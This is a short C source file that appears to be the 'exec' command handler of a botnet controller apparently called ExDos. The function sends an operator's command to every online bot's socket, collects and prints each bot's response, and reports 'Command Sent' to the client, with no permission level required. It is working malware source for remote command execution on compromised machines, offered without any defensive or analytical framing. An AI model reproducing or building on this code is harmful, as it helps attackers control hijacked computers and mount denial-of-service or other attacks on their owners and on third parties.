#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "../commands.h"

const char *EXEC_CMD_ALIAS[]      = {"exec", NULL};
const int EXEC_CMD_ARGS           = 0;
const int EXEC_CMD_RANK_LEVEL     = 0;

void exec_cmd(ExDos *x, Client *c, str *cmd, Arr *Args) {
    ClearScreen(((Client *)c)->sock);
    for(int i = 0; i < (long)((uArray *)((ExDos *)x)->online_bots)->idx; i++) {
        Write((Socket *)((Bot *)((uArray *)((ExDos *)x)->online_bots)->arr[i])->socket, cmd);
        str *check_resp = Read((Socket *)((Bot *)((uArray *)((ExDos *)x)->online_bots)->arr[i])->socket);
        
        printf("Bot Resp: %s\n", check_resp->data);
        free(check_resp);
    }
    
    place_text(((Client *)c)->sock, string("11"), string("35"), string("Command Sent"));
} 